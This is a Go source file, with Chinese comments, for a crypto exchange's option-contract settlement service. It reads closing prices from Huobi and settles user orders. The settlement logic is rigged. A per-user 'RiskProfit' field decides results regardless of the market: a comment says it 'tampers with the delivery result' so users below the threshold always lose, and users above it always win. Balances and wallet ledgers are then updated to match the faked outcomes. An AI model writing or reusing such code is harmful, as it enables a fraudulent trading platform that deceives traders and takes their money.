package main

import (
	"errors"
	"fmt"
	cmap "github.com/orcaman/concurrent-map"
	"goapi/app/models"
	"goapi/app/response"
	"goapi/bootstrap"
	"goapi/config"
	conf "goapi/pkg/config"
	"goapi/pkg/helpers"
	"goapi/pkg/huobi"
	"goapi/pkg/logger"
	"goapi/pkg/mysql"
	"goapi/pkg/redis"
	"strconv"
	"strings"
	"sync"
)

// 期权合约服务

func init() {
	// 初始化配置信息
	config.Initialize()
	// 初始化 SQL
	bootstrap.SetupDB()
}

var wg sync.WaitGroup

func main() {
	logger.Info("期权合约服务初始化")
	//初始化 Redis
	bootstrap.SetupRedis()
	defer bootstrap.RedisClose()
	db := conf.GetString("redis.db")
	sub := redis.SubExpireEvent("__keyevent@" + db + "__:expired")
	logger.Info("期权合约服务已启动")
	for {
		msg := <-sub.Channel()
		logger.Info("msg.Payload")
		logger.Info(msg.Payload)
		logger.Info("msg.Payload")
		arr := strings.Split(msg.Payload, ":")
		// 期权合约交易订单
		if arr[0] == "option_contract" && arr[1] == "order" {
			id := arr[2]
			logger.Info(fmt.Sprintf("id: %v", id))
			wg.Add(1)
			go UpdateResult(id)
			wg.Wait()
			logger.Info(fmt.Sprintf("id over: %v", id))
		}
	}

}

func UpdateResult(id string) {
	defer wg.Done()
	var result response.OptionTransactionKline
	var OptionContractTransaction models.OptionContractTransaction
	DB := mysql.DB.Debug().Begin()
	DB.Model(OptionContractTransaction).
		Where(models.Prefix("$_option_contract_transaction.id"), id).
		Joins(models.Prefix("left join $_currency on $_option_contract_transaction.currency_id=$_currency.id")).
		Select(models.Prefix("$_option_contract_transaction.*,$_currency.k_line_code")).
		Find(&result)
	logger.Info(fmt.Sprintf("k线图代码: %v", result.KLineCode))
	clinchPrice, err1 := huobi.Kline(result.KLineCode)
	Updates := cmap.New().Items()
	Updates["clinch_price"] = clinchPrice // 成交价格
	if err1 != nil {
		logger.Error(errors.New(fmt.Sprintf("获取本阶段收盘价失败: %v", err1.Error())))
		return
	}
	logger.Info(fmt.Sprintf("获取本阶段收盘价: %v", clinchPrice))
	BuyPrice, err2 := strconv.ParseFloat(result.BuyPrice, 64)
	if err2 != nil {
		logger.Error(errors.New(fmt.Sprintf("字符串转float64失败: %v", err2.Error())))
		return
	}
	// 更新交割结果
	Updates["status"] = "1"
	// 计算交割结果
	// 涨：收盘价大于开盘价
	logger.Info("clinchPrice > BuyPrice")
	if clinchPrice > BuyPrice {
		logger.Info(fmt.Sprintf("%v > %v ：涨", clinchPrice, BuyPrice))
		Updates["order_result"] = "1"
	} else {
		logger.Info(fmt.Sprintf("%v > %v ：跌", clinchPrice, BuyPrice))
		// 跌：收盘价小于开盘价
		Updates["order_result"] = "2"
	}

	// 根据风控来交易，不看k线图结果
	var User response.User
	DB.Model(models.User{}).Where("id", result.UserId).Find(&User)
	// User.RiskProfit >= 50  根据风控来交易，不看k线图结果   ||    购买结果和实际结果一样 盈利了
	// 盈利：本金+（本金*盈利率）-手续费 handle_fee
	if User.RiskProfit < 50 { // 根据风控概率直接让用户输，篡改交割结果改成和用户买的不一样
		if result.OrderType == Updates["order_result"] {
			if Updates["order_result"] == "1" {
				Updates["order_result"] = "2"
			} else {
				Updates["order_result"] = "1"
			}
			// 最终盈利
			Updates["result_profit"] = 0
		}
	} else {
		if User.RiskProfit >= 50 || result.OrderType == Updates["order_result"] {
			if User.RiskProfit >= 50 {
				Updates["order_result"] = "1"
				logger.Info(fmt.Sprintf("根据风控概率赢了 User.RiskProfit : %v", User.RiskProfit))
				logger.Info(fmt.Sprintf("风控盈利更新交割结果 : %v", Updates))
			}
			Profit := result.Price + (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
			logger.Info(fmt.Sprintf("%v + (%v * %v) - (%v * %v)", result.Price, result.Price, result.ProfitRatio/100, result.Price, result.HandleFee/100))
			logger.Info(fmt.Sprintf("最终盈利 : %v", Profit))
			Updates["result_profit"] = Profit

			// 查询用户当前钱包余额
			where := cmap.New().Items()
			where["user_id"] = result.UserId
			where["trading_pair_id"] = result.TradingPairId
			var UsersWallet response.UsersWallet
			DB.Model(models.UsersWallet{}).Where(where).Find(&UsersWallet)
			// 查询用户当前钱包余额

			// 修改钱包余额
			UpdateUsersWallet := cmap.New().Items()
			UpdateUsersWallet["available"] = UsersWallet.Available + Profit
			editError := DB.Model(models.UsersWallet{}).Where(where).Updates(UpdateUsersWallet).Error
			if editError != nil {
				logger.Error(errors.New(fmt.Sprintf("修改钱包余额失败 : %v", editError.Error())))
				DB.Rollback()
				return
			}
			// 修改钱包余额

			// 创建钱包流水
			var data models.WalletStream
			data.Way = "1"                                                 // 流转方式 1 收入 2 支出
			data.Type = "3"                                                // 流转类型 1 币币交易 2 永续合约 3 期权合约 4 申购交易 5 划转 6 充值 7 提现 8 冻结
			data.TypeDetail = "11"                                         // 流转详细类型  1 USDT充值  2 银行卡充值  3 币币交易手续费  4 永续合约手续费  5 期权合约手续费  6 币币账户划转到合约账户  7 合约账户划转到币币账户  8 申购冻结  9 币币交易  10 永续合约  11 期权合约
			data.UserId = result.UserId                                    // 用户id
			data.Email = result.Email                                      // 用户邮箱
			data.TradingPairId = helpers.StringToInt(result.TradingPairId) // 交易对id
			data.TradingPairName = result.TradingPairName                  // 交易对名称
			data.Amount = fmt.Sprintf("%v", Profit)                        // 流转金额
			data.AmountBefore = UsersWallet.Available                      // 流转前的余额
			data.AmountAfter = Profit + UsersWallet.Available              // 流转后的余额
			cErr := DB.Model(models.WalletStream{}).Create(&data).Error
			if cErr != nil {
				logger.Error(errors.New(fmt.Sprintf("创建钱包流水失败 : %v", cErr.Error())))
				DB.Rollback()
				return
			}
			// 创建钱包流水
		}
		logger.Info("clinchPrice > BuyPrice")
	}
	err3 := DB.Model(OptionContractTransaction).Where("id", id).Updates(Updates).Error
	if err3 != nil {
		logger.Error(errors.New(fmt.Sprintf("更新交割结果失败 : %v", err3.Error())))
		DB.Rollback()
	}
	DB.Model(OptionContractTransaction)
	DB.Commit()
}
